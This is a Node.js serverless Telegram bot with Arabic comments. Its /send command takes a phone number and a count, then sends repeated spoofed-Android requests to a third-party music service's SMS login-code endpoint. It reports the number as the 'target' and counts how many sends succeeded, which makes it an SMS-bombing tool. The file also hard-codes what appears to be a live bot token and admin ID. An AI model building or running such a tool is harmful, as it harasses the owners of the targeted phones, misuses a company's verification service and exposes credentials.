const axios = require('axios');

// ==========================================
// ⚙️ الإعدادات
// ==========================================
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || "8519648833:AAHeg8gNX7P1UZabWKcqeFJv0NAggRzS3Qs"; 
const ADMIN_ID = process.env.ADMIN_ID || "1431886140"; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// 🛡️ نظام الذاكرة المؤقتة (Rate Limiting)
const userRequests = new Map();

// ==========================================
// 🛠️ دوال الحماية والمساعدة
// ==========================================
function isRateLimited(userId) {
    const limitCount = 20;           
    const limitTime = 60 * 60 * 1000; 
    const now = Date.now();

    if (!userRequests.has(userId)) userRequests.set(userId, []);
    let timestamps = userRequests.get(userId).filter(t => now - t < limitTime);

    if (timestamps.length >= limitCount) {
        userRequests.set(userId, timestamps); 
        return true; 
    }

    timestamps.push(now);
    userRequests.set(userId, timestamps);
    return false; 
}

// دالة إرسال رسالة واحدة (مع إرجاع سبب الخطأ)
async function sendSingleSMS(number) {
    const url = "https://api.twistmena.com/music/Dlogin/sendCode";
    // استخدام User-Agent يحاكي هاتف أندرويد حقيقي
    const headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020)",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Host": "api.twistmena.com",
        "Connection": "Keep-Alive"
    };
    const payload = { 
        "dial": number, 
        "randomValue": Math.random().toString(36).substring(7) 
    };

    try {
        const res = await axios.post(url, payload, { headers: headers, timeout: 5000 });
        if (res.status === 200) return { success: true, reason: "200 OK" };
        return { success: false, reason: `Status ${res.status}` };
    } catch (e) {
        // التقاط رسالة الخطأ التفصيلية
        let msg = e.message;
        if (e.response) msg = `Status ${e.response.status}`; // مثلا 403 Forbidden
        else if (e.request) msg = "Network Error (Blocked)";
        return { success: false, reason: msg };
    }
}

// ==========================================
// 🚀 المعالج الرئيسي
// ==========================================
exports.handler = async function(event, context) {
    if (event.httpMethod !== "POST") return { statusCode: 405, body: "Method Not Allowed" };

    try {
        const body = JSON.parse(event.body);
        if (!body.message || !body.message.text) return { statusCode: 200, body: "No Text" };

        const chatId = body.message.chat.id;
        const text = body.message.text.trim();

        // استثناء الأدمن
        if (String(chatId) !== ADMIN_ID && isRateLimited(chatId)) {
            await axios.post(TELEGRAM_API, { chat_id: chatId, text: "⛔ تجاوزت الحد المسموح." });
            return { statusCode: 200, body: "Rate Limited" };
        }

        let replyText = "";

        // --- أمر الإرسال (/send) ---
        if (text.startsWith("/send ")) {
            const parts = text.split(" ");
            if (parts.length !== 3) {
                replyText = "⚠️ **خطأ!** اكتب: `/send 01xxxxxxxxx 1`";
            } else {
                let number = parts[1];
                let count = parseInt(parts[2]);

                if (number.startsWith("01")) number = "2" + number;
                
                // تقليل العدد إلى 3 للتجربة فقط لتفادي التايم أوت
                if (count > 5) count = 5; 

                await axios.post(TELEGRAM_API, { chat_id: chatId, text: `⏳ **جاري تجربة ${count} طلبات...**` });

                const promises = [];
                for (let i = 0; i < count; i++) promises.push(sendSingleSMS(number));

                const results = await Promise.all(promises);
                const successCount = results.filter(r => r.success).length;
                const failCount = count - successCount;
                
                // جلب أول سبب للفشل لعرضه
                const errorReason = results.find(r => !r.success)?.reason || "Unknown";

                replyText = `📊 **تقرير التشخيص:**\n\n` +
                            `🎯 **الهدف:** \`${number}\`\n` +
                            `✅ **نجح:** ${successCount}\n` +
                            `❌ **فشل:** ${failCount}\n` +
                            `⚠️ **سبب الخطأ:** \`${errorReason}\``;
            }
        }
        else if (text === "/start") {
            replyText = "👮‍♂️ **أهلاً بك.**\nجرب الأمر `/send` لترى سبب المشكلة التقنية.";
        }
        else {
             replyText = "💡 الأمر: `/send 01xxxxxxxxx 1`";
        }

        if (replyText) await axios.post(TELEGRAM_API, { chat_id: chatId, text: replyText, parse_mode: "Markdown" });
        return { statusCode: 200, body: "OK" };

    } catch (e) {
        console.error(e);
        return { statusCode: 500, body: "Error" };
    }
};
